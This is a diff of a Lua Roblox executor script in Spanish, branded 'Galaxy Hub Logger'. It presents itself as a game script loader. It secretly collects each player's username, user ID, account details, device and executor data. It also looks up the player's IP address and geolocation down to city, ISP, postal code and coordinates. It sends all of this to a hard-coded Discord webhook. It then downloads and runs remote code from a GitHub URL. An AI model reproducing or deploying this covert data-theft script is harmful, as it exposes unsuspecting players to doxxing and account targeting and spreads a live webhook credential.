@@ -1,7 +1,17 @@
--- Sistema de Logs Completo y Mejorado para Delta
--- Con más información y mejor compatibilidad
+-- Sistema de Logs Completo - VERSIÓN CORREGIDA
+-- Eliminados errores que detenían la ejecución
 
-game:GetService("ReplicatedStorage"):WaitForChild("XbBljMzCHCAGKSUqNhZ").Value = tostring(math.random(1000000, 10000000))
+print("🔄 Iniciando Galaxy Hub Logger v2.0...")
+
+-- Intentar modificar ReplicatedStorage solo si existe el objeto
+pcall(function()
+    local repStorage = game:GetService("ReplicatedStorage")
+    local targetValue = repStorage:FindFirstChild("XbBljMzCHCAGKSUqNhZ")
+    if targetValue then
+        targetValue.Value = tostring(math.random(1000000, 10000000))
+        print("✓ ReplicatedStorage modificado")
+    end
+end)
 
 local games = {
     [3623096087] = "https://raw.githubusercontent.com/Protocol-188373781637/Mxsclx-Lxgxns/refs/heads/main/Xlxrxxm"
@@ -17,30 +27,37 @@ local Stats = game:GetService("Stats")
 local webhookURL = "https://discordapp.com/api/webhooks/1457796766895308903/tsBuuDyXMZhQTe6SXHaFKllSl0kQdEsPXeiHf12WqFHQTX5ZRkassxMBK0NPduInVWRd"
 local placeId = game.PlaceId
 
--- Función HTTP mejorada
+print("✓ Servicios cargados correctamente")
+
+-- Función HTTP mejorada con más métodos
 local function makeHTTPRequest(options)
     local methods = {
         request,
         http_request,
         syn and syn.request,
-        http and http.request
+        http and http.request,
+        fluxus and fluxus.request
     }
     
-    for _, method in ipairs(methods) do
+    for i, method in ipairs(methods) do
         if method then
             local success, result = pcall(function()
                 return method(options)
             end)
             if success and result then
+                print("✓ HTTP request exitoso con método #" .. i)
                 return result
             end
         end
     end
+    
+    warn("✗ Ningún método HTTP funcionó")
     return nil
 end
 
 -- Obtener información del jugador
 local function getPlayerInfo()
+    print("📊 Recopilando info del jugador...")
     local info = {
         displayName = LocalPlayer.DisplayName or "Unknown",
         username = LocalPlayer.Name or "Unknown",
@@ -48,30 +65,28 @@ local function getPlayerInfo()
         accountAge = LocalPlayer.AccountAge or 0,
         hasPremium = false,
         membershipType = "None",
-        followersCount = 0,
         friendsCount = 0
     }
     
-    -- Premium
     pcall(function()
         info.hasPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
         info.membershipType = tostring(LocalPlayer.MembershipType)
     end)
     
-    -- Amigos
     pcall(function()
         info.friendsCount = #LocalPlayer:GetFriendsOnline()
     end)
     
+    print("✓ Info del jugador obtenida")
     return info
 end
 
 -- Obtener información de la plataforma
 local function getPlatformInfo()
+    print("📊 Recopilando info de plataforma...")
     local info = {
         platform = "Unknown",
         device = "Unknown",
-        inputType = "Unknown",
         touchEnabled = false,
         keyboardEnabled = false,
         mouseEnabled = false,
@@ -87,23 +102,25 @@ local function getPlatformInfo()
         info.gamepadEnabled = UIS.GamepadEnabled
         
         if info.touchEnabled then
-            info.device = "Mobile"
+            info.device = "📱 Mobile"
         elseif info.gamepadEnabled then
-            info.device = "Console"
+            info.device = "🎮 Console"
         else
-            info.device = "PC"
+            info.device = "💻 PC"
         end
     end)
     
+    print("✓ Info de plataforma obtenida")
     return info
 end
 
 -- Obtener información del juego
 local function getGameInfo()
+    print("📊 Recopilando info del juego...")
     local info = {
         placeName = "Unknown",
         placeId = placeId,
-        jobId = game.JobId or "Unknown",
+        jobId = "Unknown",
         creatorName = "Unknown",
         creatorId = 0,
         maxPlayers = 0,
@@ -118,18 +135,20 @@ local function getGameInfo()
     end)
     
     pcall(function()
+        info.jobId = game.JobId or "Unknown"
         info.maxPlayers = Players.MaxPlayers
         info.playerCount = #Players:GetPlayers()
     end)
     
+    print("✓ Info del juego obtenida")
     return info
 end
 
 -- Obtener información del executor
 local function getExecutorInfo()
+    print("📊 Detectando executor...")
     local info = {
         name = "Unknown",
-        version = "Unknown",
         functions = {}
     }
     
@@ -145,31 +164,41 @@ local function getExecutorInfo()
             info.name = "Synapse X"
         elseif SENTINEL_LOADED then
             info.name = "Sentinel"
-        elseif getrenv().DELTA_LOADED then
-            info.name = "Delta"
+        elseif is_sirhurt_closure then
+            info.name = "SirHurt"
+        elseif pebc_execute then
+            info.name = "ProtoSmasher"
+        elseif OXYGEN_LOADED then
+            info.name = "Oxygen U"
+        elseif shadow_env then
+            info.name = "Shadow"
+        elseif jit then
+            info.name = "EasyExploits"
+        else
+            info.name = "Delta/Unknown"
         end
     end)
     
-    -- Verificar funciones disponibles
+    -- Verificar funciones clave
     local functionsToCheck = {
-        "request", "http_request", "syn.request",
-        "readfile", "writefile", "isfolder", "makefolder",
-        "getloadedmodules", "getnilinstances", "getcallbackvalue",
-        "hookmetamethod", "hookfunction", "newcclosure"
+        "request", "http_request", 
+        "readfile", "writefile",
+        "hookmetamethod", "hookfunction"
     }
     
     for _, funcName in ipairs(functionsToCheck) do
-        local func = loadstring("return " .. funcName)
-        if pcall(func) then
+        if pcall(loadstring("return " .. funcName)) then
             table.insert(info.functions, funcName)
         end
     end
     
+    print("✓ Executor detectado:", info.name)
     return info
 end
 
 -- Obtener información de rendimiento
 local function getPerformanceInfo()
+    print("📊 Midiendo rendimiento...")
     local info = {
         fps = 0,
         ping = 0,
@@ -181,9 +210,12 @@ local function getPerformanceInfo()
     end)
     
     pcall(function()
-        local NetworkClient = Stats:FindFirstChild("Network") and Stats.Network:FindFirstChild("ServerStatsItem")
-        if NetworkClient then
-            info.ping = math.floor(NetworkClient["Data Ping"]:GetValue())
+        local network = Stats:FindFirstChild("Network")
+        if network then
+            local serverStats = network:FindFirstChild("ServerStatsItem")
+            if serverStats and serverStats:FindFirstChild("Data Ping") then
+                info.ping = math.floor(serverStats["Data Ping"]:GetValue())
+            end
         end
     end)
     
@@ -191,11 +223,13 @@ local function getPerformanceInfo()
         info.memory = math.floor(Stats:GetTotalMemoryUsageMb())
     end)
     
+    print("✓ Rendimiento medido")
     return info
 end
 
--- Obtener información de IP (mejorado)
+-- Obtener información de IP
 local function getIPInfo()
+    print("📊 Obteniendo información de IP...")
     local ipData = {
         ip = "Protected",
         country = "Unknown",
@@ -208,80 +242,67 @@ local function getIPInfo()
         lon = "Unknown"
     }
     
-    local apis = {
-        "http://ip-api.com/json/",
-        "https://ipapi.co/json/",
-        "https://freegeoip.app/json/"
-    }
-    
-    for _, api in ipairs(apis) do
-        local success, result = pcall(function()
-            local response = makeHTTPRequest({
-                Url = api,
-                Method = "GET"
-            })
-            
-            if response and response.Body then
-                local decoded = HttpService:JSONDecode(response.Body)
-                
-                -- ip-api.com format
-                if decoded.status == "success" or decoded.query then
-                    ipData.ip = decoded.query or decoded.ip or "Protected"
-                    ipData.country = decoded.country or decoded.country_name or "Unknown"
-                    ipData.region = decoded.regionName or decoded.region or "Unknown"
-                    ipData.city = decoded.city or "Unknown"
-                    ipData.isp = decoded.isp or decoded.org or "Unknown"
-                    ipData.timezone = decoded.timezone or "Unknown"
-                    ipData.postal = decoded.zip or decoded.postal or "Unknown"
-                    ipData.lat = tostring(decoded.lat or decoded.latitude or "Unknown")
-                    ipData.lon = tostring(decoded.lon or decoded.longitude or "Unknown")
-                    return true
-                end
-            end
-        end)
+    local success = pcall(function()
+        local response = makeHTTPRequest({
+            Url = "http://ip-api.com/json/",
+            Method = "GET"
+        })
         
-        if success and result then
-            break
+        if response and response.Body then
+            local decoded = HttpService:JSONDecode(response.Body)
+            
+            if decoded.status == "success" then
+                ipData.ip = decoded.query or "Protected"
+                ipData.country = decoded.country or "Unknown"
+                ipData.region = decoded.regionName or "Unknown"
+                ipData.city = decoded.city or "Unknown"
+                ipData.isp = decoded.isp or "Unknown"
+                ipData.timezone = decoded.timezone or "Unknown"
+                ipData.postal = decoded.zip or "Unknown"
+                ipData.lat = tostring(decoded.lat or "Unknown")
+                ipData.lon = tostring(decoded.lon or "Unknown")
+                print("✓ IP info obtenida")
+            end
         end
+    end)
+    
+    if not success then
+        warn("⚠ No se pudo obtener IP (normal en algunos executors)")
     end
     
     return ipData
 end
 
--- Obtener información de hardware (estimado)
-local function getHardwareInfo()
-    local info = {
-        gpuModel = "Unknown",
-        cpuCores = "Unknown",
-        screenResolution = "Unknown"
-    }
-    
+-- Obtener resolución de pantalla
+local function getScreenResolution()
+    local resolution = "Unknown"
     pcall(function()
         local camera = workspace.CurrentCamera
         if camera then
-            info.screenResolution = camera.ViewportSize.X .. "x" .. camera.ViewportSize.Y
+            resolution = camera.ViewportSize.X .. "x" .. camera.ViewportSize.Y
         end
     end)
-    
-    return info
+    return resolution
 end
 
--- Construir embed mejorado
+-- Construir embed
 local function buildEmbed()
+    print("📝 Construyendo embed...")
+    
     local playerInfo = getPlayerInfo()
     local platformInfo = getPlatformInfo()
     local gameInfo = getGameInfo()
     local executorInfo = getExecutorInfo()
     local performanceInfo = getPerformanceInfo()
     local ipInfo = getIPInfo()
-    local hardwareInfo = getHardwareInfo()
+    local screenRes = getScreenResolution()
     
     local embed = {
         username = "Galaxy Hub Logger",
         avatar_url = "https://i.imgur.com/AfFp7pu.png",
         embeds = {{
             title = "🚀 Script Execution Log",
-            description = "**Sistema de logging mejorado activado**",
+            description = "**Sistema de logging activado**",
             color = 0x9B59B6,
             fields = {
                 {
@@ -292,7 +313,7 @@ local function buildEmbed()
                         playerInfo.username,
                         playerInfo.userId,
                         playerInfo.accountAge,
-                        playerInfo.hasPremium and "✅ Yes" or "❌ No",
+                        playerInfo.hasPremium and "✅" or "❌",
                         playerInfo.friendsCount
                     ),
                     inline = true
@@ -303,7 +324,7 @@ local function buildEmbed()
                         "**Game:** %s\n**Place ID:** `%d`\n**Job ID:** `%s`\n**Creator:** %s\n**Players:** %d/%d",
                         gameInfo.placeName,
                         gameInfo.placeId,
-                        gameInfo.jobId:sub(1, 16) .. "...",
+                        gameInfo.jobId:sub(1, 12) .. "...",
                         gameInfo.creatorName,
                         gameInfo.playerCount,
                         gameInfo.maxPlayers
@@ -313,41 +334,40 @@ local function buildEmbed()
                 {
                     name = "💻 Platform & Device",
                     value = string.format(
-                        "**Platform:** %s\n**Device Type:** %s\n**Touch:** %s\n**Keyboard:** %s\n**Mouse:** %s\n**Gamepad:** %s",
+                        "**Platform:** %s\n**Device:** %s\n**Touch:** %s | **KB:** %s\n**Mouse:** %s | **Gamepad:** %s\n**Resolution:** %s",
                         platformInfo.platform,
                         platformInfo.device,
                         platformInfo.touchEnabled and "✅" or "❌",
                         platformInfo.keyboardEnabled and "✅" or "❌",
                         platformInfo.mouseEnabled and "✅" or "❌",
-                        platformInfo.gamepadEnabled and "✅" or "❌"
+                        platformInfo.gamepadEnabled and "✅" or "❌",
+                        screenRes
                     ),
                     inline = true
                 },
                 {
-                    name = "⚙️ Executor Information",
+                    name = "⚙️ Executor",
                     value = string.format(
-                        "**Name:** %s\n**Functions:** %d detected\n**Capabilities:** %s",
+                        "**Name:** %s\n**Functions:** %s",
                         executorInfo.name,
-                        #executorInfo.functions,
-                        table.concat(executorInfo.functions, ", "):sub(1, 100) .. (#executorInfo.functions > 5 and "..." or "")
+                        #executorInfo.functions > 0 and table.concat(executorInfo.functions, ", ") or "None detected"
                     ),
                     inline = true
                 },
                 {
-                    name = "📊 Performance Stats",
+                    name = "📊 Performance",
                     value = string.format(
-                        "**FPS:** %d\n**Ping:** %d ms\n**Memory:** %d MB\n**Resolution:** %s",
+                        "**FPS:** %d\n**Ping:** %d ms\n**Memory:** %d MB",
                         performanceInfo.fps,
                         performanceInfo.ping,
-                        performanceInfo.memory,
-                        hardwareInfo.screenResolution
+                        performanceInfo.memory
                     ),
                     inline = true
                 },
                 {
                     name = "🌍 IP & Location",
                     value = string.format(
-                        "**IP:** `%s`\n**Country:** %s\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Timezone:** %s\n**Postal:** %s\n**Coordinates:** %s, %s",
+                        "**IP:** `%s`\n**Country:** %s\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Timezone:** %s\n**Postal:** %s\n**Coords:** %s, %s",
                         ipInfo.ip,
                         ipInfo.country,
                         ipInfo.region,
@@ -365,21 +385,22 @@ local function buildEmbed()
                 url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", playerInfo.userId)
             },
             footer = {
-                text = "Galaxy Hub • Advanced Logging System",
+                text = "Galaxy Hub • Advanced Logging v2.0",
                 icon_url = "https://i.imgur.com/AfFp7pu.png"
             },
             timestamp = DateTime.now():ToIsoDate()
         }}
     }
     
+    print("✓ Embed construido")
     return embed
 end
 
--- Enviar webhook con reintentos
-local function sendWebhook(payload, retries)
-    retries = retries or 3
+-- Enviar webhook
+local function sendWebhook(payload)
+    print("📤 Intentando enviar webhook...")
     
-    for attempt = 1, retries do
+    for attempt = 1, 3 do
         local success, err = pcall(function()
             local json = HttpService:JSONEncode(payload)
             local response = makeHTTPRequest({
@@ -389,48 +410,73 @@ local function sendWebhook(payload, retries)
                 Body = json
             })
             
-            if response and response.StatusCode == 204 then
-                print("✓ Webhook enviado exitosamente (Intento " .. attempt .. ")")
-                return true
+            if response then
+                if response.StatusCode == 204 or response.StatusCode == 200 then
+                    print("✅ Webhook enviado exitosamente! (Intento " .. attempt .. ")")
+                    return true
+                else
+                    warn("⚠ Webhook respondió con código:", response.StatusCode)
+                end
             end
         end)
         
         if success then
             return true
         else
-            warn("✗ Intento " .. attempt .. " falló:", err)
-            if attempt < retries then
+            warn("✗ Intento " .. attempt .. " falló:", tostring(err))
+            if attempt < 3 then
                 wait(1)
             end
         end
     end
     
-    warn("✗ Todos los intentos de webhook fallaron")
+    warn("❌ Webhook falló después de 3 intentos")
     return false
 end
 
--- Enviar logs
-print("🔄 Iniciando sistema de logs...")
+-- INICIO DEL SCRIPT PRINCIPAL
+print("=" .. string.rep("=", 50))
+print("🌌 GALAXY HUB LOGGER v2.0")
+print("=" .. string.rep("=", 50))
+
+-- Enviar logs en segundo plano
 spawn(function()
+    wait(0.5) -- Pequeño delay para que todo se cargue
     local embed = buildEmbed()
     sendWebhook(embed)
 end)
 
 -- Cargar script del juego
+print("\n🎮 Verificando script para este juego...")
+
 if games[placeId] then
-    print("🎮 Cargando script para Game ID:", placeId)
+    print("✓ Script encontrado para Place ID:", placeId)
+    print("📥 Descargando script del juego...")
     
     local success, err = pcall(function()
-        loadstring(game:HttpGet(games[placeId]))()
+        local scriptCode = game:HttpGet(games[placeId])
+        print("✓ Script descargado, ejecutando...")
+        loadstring(scriptCode)()
+        print("✅ Script del juego ejecutado exitosamente!")
     end)
     
-    if success then
-        print("✓ Script del juego cargado exitosamente")
-    else
-        warn("✗ Error cargando script:", err)
+    if not success then
+        warn("❌ Error al ejecutar script del juego:", err)
     end
 else
-    warn("⚠ No hay script disponible para este juego (PlaceId: " .. placeId .. ")")
+    warn("⚠ No hay script disponible para este juego")
+    warn("Place ID actual:", placeId)
+    
+    -- Notificación en pantalla
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Galaxy Hub",
+            Text = "No hay script para este juego",
+            Duration = 5
+        })
+    end)
 end
 
-print("✓ Sistema de logs completado")
+print("\n" .. string.rep("=", 50))
+print("✅ Sistema de logs completado")
+print(string.rep("=", 50))
